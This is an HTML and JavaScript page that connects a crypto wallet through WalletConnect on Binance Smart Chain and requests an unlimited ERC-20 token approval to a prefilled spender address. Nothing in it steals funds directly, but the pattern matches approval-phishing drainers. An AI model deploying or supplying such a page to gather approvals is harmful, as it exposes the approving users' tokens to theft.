<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Unlimited Token Approval</title>
  <script src="https://unpkg.com/ethers@5.7.2/dist/ethers.umd.min.js"></script>
  <script src="https://unpkg.com/@walletconnect/web3-provider@1.7.5/dist/umd/index.min.js"></script>
  <script src="https://unpkg.com/web3modal@1.9.5/dist/index.js"></script>
</head>
<body>
  <h2>Connect Wallet (QR Supported)</h2>
  <div id="status">Not connected</div>
  <button id="connectButton">Connect Wallet</button>

  <h3>Unlimited Approve</h3>

  <label>Spender Address:</label><br />
  <input type="text" id="spenderAddress" value="0xb300000b72DEAEb607a12d5f54773D1C19c7028d" style="width: 400px;" /><br /><br />

  <label>Token Address:</label><br />
  <input type="text" id="tokenAddress" value="0x7e975D85714B11d862C7cFFEe3C88d565a139Eb7" style="width: 400px;" /><br /><br />

  <button id="approveButton" disabled>Approve Unlimited</button>

  <script>
    let signer;

    const providerOptions = {
      walletconnect: {
        package: window.WalletConnectProvider.default,
        options: {
          rpc: {
            56: "https://bsc-dataseed.binance.org/",
          },
        },
      },
    };

    const web3Modal = new window.Web3Modal.default({
      cacheProvider: false,
      providerOptions,
    });

    let instance;

    async function connectWallet() {
      try {
        instance = await web3Modal.connect();
        const provider = new ethers.providers.Web3Provider(instance);
        signer = provider.getSigner();
        const address = await signer.getAddress();
        document.getElementById("status").innerText = "Connected: " + address;
        document.getElementById("approveButton").disabled = false;
      } catch (err) {
        console.error("Connection failed", err);
        document.getElementById("status").innerText = "Connection failed: " + err.message;
      }
    }

    async function approveToken() {
      try {
        const spender = document.getElementById("spenderAddress").value.trim();
        const tokenAddress = document.getElementById("tokenAddress").value.trim();

        if (!spender || !ethers.utils.isAddress(spender)) {
          alert("Invalid spender address");
          return;
        }

        if (!tokenAddress || !ethers.utils.isAddress(tokenAddress)) {
          alert("Invalid token address");
          return;
        }

        const tokenAbi = [
          "function approve(address spender, uint256 amount) public returns (bool)",
        ];

        const tokenContract = new ethers.Contract(tokenAddress, tokenAbi, signer);

        const amount = ethers.constants.MaxUint256; // âœ… Unlimited approve
        document.getElementById("status").innerText = "Approving unlimited...";
        const tx = await tokenContract.approve(spender, amount);
        await tx.wait();

        document.getElementById("status").innerText = "Approval success! Tx: " + tx.hash;
      } catch (err) {
        console.error("Approval failed", err);
        document.getElementById("status").innerText = "Approval failed: " + err.message;
      }
    }

    document.getElementById("connectButton").addEventListener("click", connectWallet);
    document.getElementById("approveButton").addEventListener("click", approveToken);
  </script>
</body>
</html>
